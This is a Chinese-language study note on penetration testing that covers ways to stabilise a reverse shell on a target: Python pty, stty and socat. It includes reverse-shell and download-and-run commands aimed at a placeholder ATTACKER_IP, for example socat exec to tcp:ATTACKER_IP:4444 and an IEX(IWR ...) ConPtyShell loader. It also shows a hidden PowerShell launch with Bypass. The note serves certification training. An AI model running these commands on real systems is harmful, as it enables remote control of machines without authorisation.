# 第 57 章 - Shell 穩定化

## 標籤

- #cpts
- #chapter
- #shell
- #stabilization

## 學習目標

- 能用 Python/Python3 的 pty 模組升級 shell 為 PTY。
- 能用 stty raw -echo + fg 取得完整互動 shell。
- 能設定 TERM、rows、cols 修正顯示問題。
- 知道 socat、rlwrap 的替代穩定化方法。

---

## 理論基礎

```text
為何需要穩定化：
  初始 reverse shell 通常是 raw shell（非 TTY）：
  - Ctrl+C 直接終止整個 shell（不只是當前命令）
  - sudo 需要 TTY → sudo: no tty present
  - vim / nano 無法正常顯示
  - 不支援 job control（Ctrl+Z / bg / fg）
  - 方向鍵顯示 ^[[A 而不是移動游標

穩定化目標：
  取得 PTY（pseudo-terminal）讓 shell 像真實 terminal 一樣運作

三種主要穩定化方法：
  1. Python pty.spawn（最常用）
  2. socat（最完整，但需要 socat）
  3. script 命令（某些環境的替代）
```

---

## 方法一：Python PTY 升級（最常用）

```bash
# ── 在目標 shell 中執行 ──

# 步驟 1：用 Python 生成 PTY
python3 -c 'import pty; pty.spawn("/bin/bash")'
# pty.spawn → 在偽終端中啟動 /bin/bash
# 若目標沒有 python3 試：
python -c 'import pty; pty.spawn("/bin/bash")'
# 或：
script /dev/null -c bash
# script → 記錄工作階段工具，副作用是提供 PTY

# 步驟 2：背景化這個 shell（讓本地 terminal 設定生效）
# 按 Ctrl+Z（暫停 nc/shell 到背景）

# 步驟 3：在攻擊機上設定 terminal（讓目標 shell 知道正確大小）
stty raw -echo; fg
# stty raw → 把本地 terminal 設為 raw mode（不處理特殊字元）
# -echo → 不回顯輸入（避免雙重顯示）
# fg → 把背景的 shell 拉回前景

# 步驟 4：在目標 shell 中設定 TERM 和終端大小
export TERM=xterm-256color
# 或
export TERM=xterm
# 讓目標 shell 知道終端類型（支援顏色、方向鍵等）

# 確認本地 terminal 的實際大小（另開 terminal 執行）
stty size
# 輸出：rows cols（例如 24 80）

# 在目標 shell 中設定相同大小
stty rows 24 cols 80
# 依照你本地 terminal 的實際大小填入

# 完成！現在可以用 Ctrl+C / 方向鍵 / vim 等
```

---

## 方法二：socat 穩定化（最完整）

```bash
# ── 攻擊機 ──

# 用 socat 替代 nc 監聽（提供完整 PTY）
socat file:`tty`,raw,echo=0 tcp-listen:4444
# file:`tty` → 把本地 TTY 連到 socket
# raw,echo=0 → raw mode，不回顯

# ── 目標執行 ──

# 若目標有 socat
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER_IP:4444
# exec:'bash -li' → 執行互動式 bash
# pty → 分配 PTY
# stderr → 也轉送 stderr
# setsid → 建立新 session（解決 job control）
# sigint → 允許 Ctrl+C 傳入 bash（不終止 socat）
# sane → 設定合理 terminal 屬性
# tcp:ATTACKER_IP:4444 → 連回攻擊機

# 若目標沒有 socat，先傳過去
# 攻擊機架 HTTP server
python3 -m http.server 8080
# 目標下載
wget http://ATTACKER_IP:8080/socat -O /tmp/socat
chmod +x /tmp/socat
/tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER_IP:4444
# socat 靜態二進位下載：https://github.com/andrew-d/static-binaries
```

---

## 方法三：rlwrap（快速改善，不完全 PTY）

```bash
# 監聽時加上 rlwrap（提供歷史命令與方向鍵）
rlwrap nc -lvnp 4444
# rlwrap → readline wrapper，讓 nc 支援上下方向鍵歷史
# 適合不需要完整 PTY 的快速操作

# rlwrap 不提供 TTY，但至少讓方向鍵和 Ctrl+C 更友善
# 取得 shell 後仍需要做 python pty 升級
```

---

## 方法四：Windows Shell 改善（PowerShell / ConPTY）

```bash
# Windows reverse shell 通常直接用 PowerShell（已有基本 TTY 特性）

# 目標：PowerShell 互動 shell（較完整）
powershell -NoP -NonI -W Hidden -Exec Bypass

# 攻擊機用 rlwrap 改善體驗
rlwrap nc -lvnp 4444

# 或使用 evil-winrm（自動提供好用互動環境）
evil-winrm -i TARGET_IP -u USERNAME -p PASSWORD

# ConPTY shell（完整 Windows PTY，需要 Windows 10+）
# 工具：Invoke-ConPtyShell（https://github.com/antonioCoco/ConPtyShell）
# 攻擊機監聽
stty raw -echo; (stty size; cat) | nc -lvnp 4444

# 目標執行
IEX(IWR http://ATTACKER_IP/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell ATTACKER_IP 4444
```

---

## 完整穩定化流程（最常用步驟整合）

```bash
# ═══ 在目標 shell 中 ═══
python3 -c 'import pty; pty.spawn("/bin/bash")'

# ═══ 按 Ctrl+Z（暫停到背景）═══

# ═══ 在攻擊機執行 ═══
stty raw -echo; fg

# ═══ 回到目標 shell 後 ═══
export TERM=xterm-256color
stty rows 40 cols 200    # 依你的 terminal 大小調整

# ═══ 驗證穩定化是否成功 ═══
# 測試 Ctrl+C → 應只中斷當前命令，不終止 shell
# 測試方向鍵 → 應移動游標而非顯示 ^[[A
# 測試 sudo -l → 不應出現 "no tty present"
# 測試 vim test.txt → 應正常顯示
```

---

## 速查表

```bash
# 攻擊機監聽（推薦）
rlwrap nc -lvnp 4444

# 目標：Python PTY 升級
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Ctrl+Z 後攻擊機
stty raw -echo; fg

# 目標：設定 terminal
export TERM=xterm-256color
stty rows 40 cols 200

# socat 完整 PTY（攻擊機）
socat file:`tty`,raw,echo=0 tcp-listen:4444

# socat 完整 PTY（目標）
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER_IP:4444
```

---

## 常見錯誤與排查

- Ctrl+Z 後 stty raw -echo 沒輸入 fg 就按 Enter → 攻擊機本地 terminal 壞掉；輸入 `reset` 恢復。
- python3 不存在 → 試 python、script /dev/null、或 script -q /dev/null。
- stty rows/cols 設錯 → vim 等工具顯示錯亂；重新確認 `stty size` 並設定正確值。
- socat 版本不支援 sigint 參數 → 移除 sigint 參數再試。

---

## 關聯筆記

- [[55-Shell基礎|第 55 章 - Shell 基礎]]
- [[56-酬載產生|第 56 章 - 酬載產生]]
- [[06-Volume-6-Shells-and-Payloads-Index|Vol.6 - Shells and Payloads]]
